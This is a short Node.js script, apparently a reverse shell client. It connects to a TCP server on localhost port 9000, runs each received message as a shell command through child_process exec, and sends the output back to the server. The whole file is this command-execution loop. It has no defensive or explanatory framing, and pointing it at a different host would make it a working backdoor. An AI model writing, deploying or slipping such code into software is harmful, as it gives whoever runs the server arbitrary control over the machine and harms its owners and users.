import { createConnection } from "net";
import { exec } from "child_process";
const client = createConnection({ host: "127.0.0.1", port: 9000 }, () => {
  console.log("Connected to server");
  client.write("HELLO SERVER\n");
});

client.on("data", (data) => {
  const recived = data.toString();
  console.log(`Recived: ${recived}`);

  if (recived.includes("HELLO") || recived.includes("ACK")) return;

  exec(recived, (stdin, stdout, stderr) => {
    if (stderr) {
      client.write("There was an error: " + stderr + "\n");
      return;
    }

    client.write(`\n${stdout}\n`);
  });
});

client.on("end", () => console.log("Disconnected from server"));

client.on("error", (err) => console.error("There was an error" + err));
